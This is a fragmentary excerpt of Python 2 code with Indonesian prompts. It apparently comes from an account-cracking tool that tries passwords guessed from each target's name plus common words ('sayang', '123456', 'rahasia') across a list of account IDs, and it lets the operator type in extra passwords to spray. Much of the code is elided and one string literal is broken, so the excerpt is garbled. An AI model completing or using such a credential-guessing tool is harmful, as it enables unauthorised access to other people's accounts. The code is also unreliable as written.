...
def pilih_menubapi():
    ...
    def main(arg):
        ...
        try:
            for pw in [name.lower() + '123','name', 'sayang','123456','rahasia','bismillah,'anjing',name.lower() + '1234', name.lower() + '12345', name.lower()]:
...
def manualmbasic():
    print'\n[*] Masukan Password Contoh : sayang,123456,rahasia'
    pw = raw_input('[?] Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Bener, Tidak Boleh Kosong')
    print'[*] Total ID : ' + str(len(id))
